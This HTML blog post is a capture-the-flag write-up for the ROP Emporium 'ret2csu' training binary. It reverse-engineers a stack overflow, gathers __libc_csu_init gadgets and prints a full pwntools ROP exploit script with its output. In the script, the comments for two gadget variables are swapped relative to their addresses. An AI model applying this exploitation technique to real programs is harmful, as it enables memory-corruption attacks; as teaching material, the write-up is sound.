<!doctype html><html lang=en>
<head>
<meta charset=utf-8>
<meta http-equiv=x-ua-compatible content="ie=edge">
<meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no">
<meta name=author content>
<meta name=description content="ROP Emporium 'ret2csu' challenge.">
<meta name=keywords content>
<meta name=robots content="noodp">
<meta name=theme-color content>
<link rel=canonical href=https://anvbis.github.io/posts/rop-emporium-ret2csu/>
<title>
ROP Emporium :: RET2CSU :: Anubis
</title>
<link href=https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css rel=stylesheet type=text/css>
<link rel=stylesheet href=/main.04ccab17a090ab7631f283645aff8adfdbd0eb8d6fc2738d01581aa99a6ce4ef.css>
<meta itemprop=name content="ROP Emporium :: RET2CSU">
<meta itemprop=description content="ROP Emporium 'ret2csu' challenge."><meta itemprop=datePublished content="2021-08-12T00:00:00+00:00">
<meta itemprop=dateModified content="2021-08-12T00:00:00+00:00">
<meta itemprop=wordCount content="1498"><meta itemprop=image content="https://anvbis.github.io">
<meta itemprop=keywords content>
<meta name=twitter:card content="summary_large_image">
<meta name=twitter:image content="https://anvbis.github.io">
<meta name=twitter:title content="ROP Emporium :: RET2CSU">
<meta name=twitter:description content="ROP Emporium 'ret2csu' challenge.">
<meta property="og:title" content="ROP Emporium :: RET2CSU">
<meta property="og:description" content="ROP Emporium 'ret2csu' challenge.">
<meta property="og:type" content="article">
<meta property="og:url" content="https://anvbis.github.io/posts/rop-emporium-ret2csu/"><meta property="og:image" content="https://anvbis.github.io"><meta property="article:section" content="posts">
<meta property="article:published_time" content="2021-08-12T00:00:00+00:00">
<meta property="article:modified_time" content="2021-08-12T00:00:00+00:00"><meta property="og:site_name" content="Anubis">
<meta property="article:section" content="Linux">
<meta property="article:section" content="Return Oriented Programming">
<meta property="article:section" content="Capture the Flag">
<meta property="article:published_time" content="2021-08-12 00:00:00 +0000 UTC">
</head>
<body>
<div class=container>
<header class=header>
<span class=header__inner>
<a href=/ style=text-decoration:none>
<div class=logo>
<span class=logo__mark>></span>
<span class=logo__text>anvbis</span>
<span class=logo__cursor>
</span>
</div>
</a>
<span class=header__right>
<nav class=menu>
<ul class=menu__inner><li><a href=/posts>Blog</a></li>
</ul>
</nav>
<span class=menu-trigger><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M0 0h24v24H0z" fill="none"/><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/></svg>
</span>
</span>
</span>
</header>
<div class=content>
<main class=post>
<div class=post-info>
</p>
</div>
<article>
<h2 class=post-title><a href=https://anvbis.github.io/posts/rop-emporium-ret2csu/>ROP Emporium :: RET2CSU</a></h2>
<div class=post-content>
<h2 id=reverse-engineering>Reverse Engineering</h2>
<p>Let&rsquo;s run the <code>file</code> command to get a brief overview of the binary. Note that it is a 64-bit linux executable.</p>
<pre><code>$ file ./ret2csu
ret2csu: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=f722121b08628ec9fc4a8cf5abd1071766097362, not stripped
</code></pre><p>We can also run <code>checksec</code> against the target. This reveals a little more information, we can see that there is no stack canary, so there&rsquo;s no need to bypass that protection. We can also see that the NX bit is enabled, so we can&rsquo;t execute shellcode.</p>
<pre><code>$ checksec ./ret2csu
[*] './ret2csu'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b'.'
</code></pre><p>Running the executable shows us that it at some point takes user input. This is likely where we&rsquo;ll be able to find some vulnerability.</p>
<pre><code>$ ./ret2csu                   
ret2csu by ROP Emporium
x86_64

Check out https://ropemporium.com/challenge/ret2csu.html for information on how to solve this challenge.

&gt; hello
Thank you!
</code></pre><p>After a tiny bit of reverse engineering, we see this <code>pwnme</code> function called by <code>main</code>. We can see that it allocates 0x20 bytes of memory for a buffer <code>buf</code>, before reading in 0x200 bytes from stdin and storing it in the buffer - here is our overflow.</p>
<pre><code>void pwnme(void)
{
    void *buf;
    
    setvbuf(*_reloc.stdout, 0, 2, 0);
    puts(0xc88);
    puts(0xca0);
    memset(&amp;buf, 0, 0x20);
    puts(0xca8);
    printf(0xd12);
    read(0, &amp;buf, 0x200);
    puts(0xd15);
    return;
}
</code></pre><p>Further investigation reveals that there is a function called <code>ret2win</code>. Another function <code>usefulFunction</code> appears to call <code>ret2win</code> with the parameters <code>ret2win(0x3, 0x2, 0x1)</code>. We&rsquo;ll want to investigate this function further.</p>
<pre><code>0x00400510    1 6            sym.imp.ret2win
</code></pre><pre><code>0x000000000040061b &lt;+4&gt;:     mov    edx,0x3
0x0000000000400620 &lt;+9&gt;:     mov    esi,0x2
0x0000000000400625 &lt;+14&gt;:    mov    edi,0x1
0x000000000040062a &lt;+19&gt;:    call   0x400510 &lt;ret2win@plt&gt;
</code></pre><p>Reversing the <code>ret2win</code> function reveals that it will immediately call <code>exit</code> if the correct parameters are not provided. If the correct parameters are provided, however, the binary will decrypt and print the flag stored in <code>encrypted_flag.dat</code>.</p>
<p>The correct parameters are as follows:</p>
<ul>
<li><code>$rdi = 0xdeadbeefdeadbeef</code>.</li>
<li><code>$rsi = 0xcafebabecafebabe</code>.</li>
<li><code>$rdx = 0xd00df00dd00df00d</code>.</li>
</ul>
<p>So we have to find some way to set all of these registers to their correct values before calling the <code>ret2win</code> function in order to get the flag.</p>
<pre><code>      0x000009ef      48b8efbeadde.  movabs rax, 0xdeadbeefdeadbeef
      0x000009f9      483945e8       cmp qword [var_18h], rax
  ┌─&lt; 0x000009fd      0f85d7000000   jne 0xada
  │   0x00000a03      48b8bebafeca.  movabs rax, 0xcafebabecafebabe
  │   0x00000a0d      483945e0       cmp qword [var_20h], rax
 ┌──&lt; 0x00000a11      0f85c3000000   jne 0xada
 ││   0x00000a17      48b80df00dd0.  movabs rax, 0xd00df00dd00df00d
 ││   0x00000a21      483945d8       cmp qword [var_28h], rax
┌───&lt; 0x00000a25      0f85af000000   jne 0xada
│││   0x00000a2b      488d35ee0200.  lea rsi, [0x00000d20]
│││   0x00000a32      488d3de90200.  lea rdi, str.encrypted_flag.dat
│││   0x00000a39      e8f2fdffff     call sym.imp.fopen

...

│││
└└└─&gt; 0x00000ada      488d3d930200.  lea rdi, str.Incorrect_parameters
      0x00000ae1      e8bafcffff     call sym.imp.puts           ; int puts(const char *s)
      0x00000ae6      bf01000000     mov edi, 1                  ; int status
      0x00000aeb      e850fdffff     call sym.imp.exit           ; void exit(int status)
</code></pre><h2 id=information-gathering>Information Gathering</h2>
<p>First, let&rsquo;s find the offset of the return address from where our input buffer is stored in the <code>pwnme</code> function.</p>
<p>We&rsquo;ll use a small script to attach the process to GDB and store a cyclic pattern of bytes in our input buffer. This will allow us to calculate the offset from the start of our input buffer to the return address.</p>
<pre><code>#!/usr/bin/env python3

from pwn import *

r = process('./ret2csu')
gdb.attach(r)

r.clean()
r.writeline(cyclic(200))

r.interactive()
</code></pre><p>We can continue within GDB, and print the value at the top of the stack to get the value stored in the return pointer.</p>
<pre><code>pwndbg&gt; x/gx $rsp
0x7ffe9d7c4538: 0x6161616161616166
</code></pre><p>Using pwntools' <code>cyclic_find</code> function we can get the offset from the start of our input buffer to the return address stored on the stack.</p>
<pre><code>In [2]: cyclic_find(0x6161616161616166, n=8)
Out[2]: 40
</code></pre><p>Next let&rsquo;s figure out how we can store a value in the <code>$rdx</code> register. We&rsquo;re able to store values in the <code>$rdi</code> and <code>$rsi</code> registers quite easily (they have <code>pop; ret</code> gadgets we can easily use).</p>
<p>After digging around the <code>__libc_csu_init</code> function, we find two interesting looking gadgets, see below (I&rsquo;ve added some comments for clarity).</p>
<p>Note that we can use the first gadget to set the values of <code>$rsi</code> and <code>$rdx</code>.</p>
<pre><code>0x00400680      4c89fa         mov rdx, r15
0x00400683      4c89f6         mov rsi, r14
0x00400686      4489ef         mov edi, r13d 
0x00400689      41ff14dc       call qword [r12 + rbx*8]
0x0040068d      4883c301       add rbx, 1
0x00400691      4839dd         cmp rbp, rbx
0x00400694      75ea           jne 0x400680
</code></pre><pre><code>0x0040069a      5b             pop rbx ; set to 0
0x0040069b      5d             pop rbp ; set to 1 to bypass check after call
0x0040069c      415c           pop r12 ; set to pointer to useless function
0x0040069e      415d           pop r13
0x004006a0      415e           pop r14 ; set to 0xcafebabecafebabe to store in $rsi
0x004006a2      415f           pop r15 ; set to 0xd00df00dd00df00d to store in $rdx
0x004006a4      c3             ret
</code></pre><p>It&rsquo;ll be a little complex, but we should be able to use these to get the values we want into our target registers. I&rsquo;ve added some comments to the above</p>
<p>We can use the second gadget to set up for the first gadget (so we can move the correct values into our target registers).</p>
<p>Note the <code>call qword [r12 + rbx*8]</code> instruction. As it dereferences a pointer to a function, we can&rsquo;t use this to redirect execution.</p>
<pre><code>0x00400686      4489ef         mov edi, r13d 
0x00400689      41ff14dc       call qword [r12 + rbx*8]
0x0040068d      4883c301       add rbx, 1
</code></pre><p>Instead we&rsquo;ll have to find a pointer to some function that doesn&rsquo;t change anything, as to not ruin the values stored in our target registers. We&rsquo;ll just pass by this call and head to the <code>ret</code> instruction below.</p>
<p>Let&rsquo;s take a look at the functions stored in the binary, and see if we can find any pointers to them.</p>
<pre><code>pwndbg&gt; info functions
All defined functions:

Non-debugging symbols:
0x00000000004004d0  _init
0x0000000000400500  pwnme@plt
0x0000000000400510  ret2win@plt
0x0000000000400520  _start
0x0000000000400550  _dl_relocate_static_pie
0x0000000000400560  deregister_tm_clones
0x0000000000400590  register_tm_clones
0x00000000004005d0  __do_global_dtors_aux
0x0000000000400600  frame_dummy
0x0000000000400607  main
0x0000000000400617  usefulFunction
0x0000000000400640  __libc_csu_init
0x00000000004006b0  __libc_csu_fini
0x00000000004006b4  _fini
</code></pre><p>Using <code>objdump</code> and <code>grep</code> we can look for the first couple bytes of each function, and see if they show up anywhere in the disassembly.</p>
<p>The address that immediately jumps out to me is <code>0x4003af</code>, which contains the bytes for the <code>_fini</code> function, a suitably inert function.</p>
<pre><code>$ objdump -D ret2csu | grep '06 40' -B 1
  4003ad:       00 0e                   add    %cl,(%rsi)
  4003af:       00 b4 06 40 00 00 00    add    %dh,0x40(%rsi,%rax,1)
--
  40052e:       54                      push   %rsp
  40052f:       49 c7 c0 b0 06 40 00    mov    $0x4006b0,%r8
  400536:       48 c7 c1 40 06 40 00    mov    $0x400640,%rcx
  40053d:       48 c7 c7 07 06 40 00    mov    $0x400607,%rdi
--
  600e45:       00 00                   add    %al,(%rax)
  600e47:       00 b4 06 40 00 00 00    add    %dh,0x40(%rsi,%rax,1)
</code></pre><p>We can look this up in GDB to be sure (adding 1 to align the address correctly).</p>
<pre><code>pwndbg&gt; x/x (0x4003af + 1)
0x4003b0:       0x00000000004006b4
</code></pre><p>Now we can use the <code>ropper</code> tool to find a gadget to set the value of <code>$rdi</code>. Surprise, surprise, we immediately find one.</p>
<pre><code>$ ropper --file ./ret2csu --search '% rdi' 
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: % rdi

[INFO] File: ./ret2csu
0x00000000004006a3: pop rdi; ret;
</code></pre><h2 id=exploit-development>Exploit Development</h2>
<p>We have all the information we need, so let&rsquo;s start building our exploit. Here&rsquo;s an outline of what we want to achieve:</p>
<ul>
<li>Overwrite the return address in the <code>pwnme</code> function.</li>
<li>Store the values <code>0xcafebabecafebabe</code> and <code>0xd00df00dd00df00d</code> in the <code>$rsi</code> and <code>$rdx</code> registers.</li>
<li>Store the value <code>0xdeadbeefdeadbeef</code> in the <code>$rdi</code> register.</li>
<li>Call the <code>ret2win</code> function with the above values.</li>
</ul>
<p>Note: we have to be pretty careful when using the gadgets we found in the csu function, in order to pass the check after the call, we have to set the values <code>$rbp = 1</code> and <code>$rbx = 0</code>.</p>
<p>We also have to pad out the stack so that the <code>pop</code> instructions after the call don&rsquo;t destroy our rop chain.</p>
<pre><code>#!/usr/bin/env python3

from pwn import *

context.arch = 'amd64'


'''
pop rbx     ; 0
pop rbp     ; 1
pop r12     ; 0x4003af+1
pop r13
pop r14     ; 0xcafebabecafebabe
pop r15     ; 0xd00df00dd00df00d
ret         ; ret2csu_rdx
'''
ret2csu_set = 0x00400680

'''
mov rdx, r15
mov rsi, r14
mov edi, r13d
call qword [r12 + rbx*8]
'''
ret2csu_rdx = 0x0040069a

'''
pop rdi     ; 0xdeadbeefdeadbeef
ret         ; ret2win
'''
pop_rdi = 0x004006a3

'''
jmp qword [reloc.ret2win]
'''
ret2win = 0x00400510 


elf = ELF('./ret2csu')
rop = ROP(elf)

# ret2csu_set
rop.raw(ret2csu_rdx)
rop.raw(0)                  # pop rbx
rop.raw(1)                  # pop rbp
rop.raw(0x4003af+1)         # pop r12
rop.raw(0)                  # pop r13
rop.raw(0xcafebabecafebabe) # pop r14
rop.raw(0xd00df00dd00df00d) # pop r15

# ret2csu_rdx
rop.raw(ret2csu_set)

# pop_rdi
rop.raw(0)                  # stack alignment
rop.raw(0)                  # pop rbx
rop.raw(0)                  # pop rbp
rop.raw(0)                  # pop r12
rop.raw(0)                  # pop r13
rop.raw(0)                  # pop r14
rop.raw(0)                  # pop r15
rop.raw(pop_rdi)
rop.raw(0xdeadbeefdeadbeef) # pop rdi

# ret2win
rop.raw(ret2win)

r = process('./ret2csu')

r.clean()
r.writeline(b'A'*40 + rop.chain())

r.readline()
log.success('Flag: ' + r.readline().decode('utf-8'))
</code></pre><p>And finally, here&rsquo;s our exploit in action.</p>
<pre><code>./exploit.py 
[*] './ret2csu'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b'.'
[*] Loaded 13 cached gadgets for './ret2csu'
[+] Starting local process './ret2csu': pid 1110
[+] Flag: ROPE{a_placeholder_32byte_flag!}
[*] Process './ret2csu' stopped with exit code 0 (pid 1110)
</code></pre>
</div>
</article>
<hr>
<div class=post-info>
<p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-folder meta-icon"><path d="M22 19a2 2 0 01-2 2H4a2 2 0 01-2-2V5a2 2 0 012-2h5l2 3h9a2 2 0 012 2z"/></svg>
<span class=tag><a href=https://anvbis.github.io/categories/linux/>Linux</a></span>
<span class=tag><a href=https://anvbis.github.io/categories/return-oriented-programming/>Return Oriented Programming</a></span>
<span class=tag><a href=https://anvbis.github.io/categories/capture-the-flag/>Capture the Flag</a></span>
</p>
</div>
</main>
</div>
<footer class=footer>
</footer>
</div>
<script type=text/javascript src=/bundle.min.72f3cdb1757e654c5aa1329a4269ea6a8d7b37513de3b9d54d7a5ca25573fb3a64f872d6c36cdb2acf759068fd27157cda3ac3827a42378d38946a025e58b6e6.js integrity="sha512-cvPNsXV+ZUxaoTKaQmnqao17N1E947nVTXpcolVz+zpk+HLWw2zbKs91kGj9JxV82jrDgnpCN404lGoCXli25g=="></script>
</body>
</html>